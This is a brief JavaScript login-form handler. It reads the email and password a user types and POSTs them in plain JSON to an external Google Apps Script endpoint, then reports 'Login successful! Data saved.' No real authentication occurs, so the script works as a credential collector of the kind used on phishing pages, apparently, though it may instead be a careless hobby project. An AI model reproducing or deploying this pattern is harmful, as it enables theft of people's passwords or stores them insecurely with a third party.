document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const scriptURL = "https://script.google.com/macros/s/AKfycbwg2o9QRslZwwdile9S10FnaYy8cit1Y8DO7OtCNswwncSPOu5sTn_dt1h2Cfi0HTKJyQ/exec"; 

  fetch(scriptURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  })
    .then((response) => response.text())
    .then((data) => {
      alert("Login successful! Data saved.");
    })
    .catch((error) => {
      alert("Error! Please check your script or network.");
      console.error("Error:", error);
    });
});
